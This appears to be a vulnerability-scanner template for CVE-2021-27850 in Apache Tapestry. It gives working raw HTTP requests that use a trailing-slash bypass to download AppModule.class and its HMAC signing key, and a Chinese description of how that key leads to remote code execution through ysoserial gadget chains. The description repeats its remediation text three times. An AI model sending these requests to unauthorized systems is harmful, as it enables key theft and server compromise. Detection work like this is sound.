id: CVE-2021-27850
info:
  name: Apache Tapestry - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Apache Tapestry 文件读取与反序列化漏洞
    在所有最新版本的 Apache Tapestry 中都发现了一个严重的未经身份验证的远程代码执行漏洞。受影响的版本包括 5.4.5、5.5.0、5.6.2 和 5.7.0。我发现的漏洞是绕过 CVE-2019-0195 的修复程序。回顾：在修复 CVE-2019-0195 之前，可以通过提供精心制作的资产文件 URL 从类路径下载任意类文件。攻击者能够通过请求包含 HMAC 密钥的 URL `http://localhost:8080/assets/something/services/AppModule.class` 来下载文件 `AppModule.class`。该错误的修复是一个黑名单过滤器，它检查 URL 是否以 `.class`、`.properties` 或 `.xml` 结尾。绕过：不幸的是，可以通过在 URL 末尾附加一个 `/` 来绕过黑名单解决方案：`http://localhost:8080/assets/something/services/AppModule。class/` 黑名单检查后，斜线被剥离，文件 `AppModule.class` 被加载到响应中。此类通常包含用于对序列化 Java 对象进行签名的 HMAC 密钥。知道该密钥后，攻击者可以签署通向 RCE 的 Java 小工具链（例如来自 ysoserial 的 CommonsBeanUtils1）。此漏洞的解决方案： * 对于 Apache Tapestry 5.4.0 到 5.6.1，升级到 5.6.2 或更高版本。* 对于 Apache Tapestry 5.7.0，升级到 5.7.1 或更高版本。此漏洞的解决方案： * 对于 Apache Tapestry 5.4.0 到 5.6.1，升级到 5.6.2 或更高版本。* 对于 Apache Tapestry 5.7.0，升级到 5.7.1 或更高版本。此漏洞的解决方案： * 对于 Apache Tapestry 5.4.0 到 5.6.1，升级到 5.6.2 或更高版本。* 对于 Apache Tapestry 5.7.0，升级到 5.7.1 或更高版本。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/r237ff7f286bda31682c254550c1ebf92b0ec61329b32fbeb2d1c8751%40%3Cusers.tapestry.apache.org%3E
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - application/java
  - type: word
    condition: and
    part: body
    words:
    - configuration
    - webtools
  extractors:
  - name: id
    type: regex
    regex:
    - \/assets\/app\/([a-z0-9]+)\/services\/AppMod
    group: 1
    part: header
    internal: true
  matchers-condition: and
  raw:
  - |
    GET /assets/app/something/services/AppModule.class/ HTTP/1.1
    Host: {{Hostname}}
    Origin: {{BaseURL}}
  - |
    GET /assets/app/{{id}}/services/AppModule.class/ HTTP/1.1
    Host: {{Hostname}}
    Origin: {{BaseURL}}
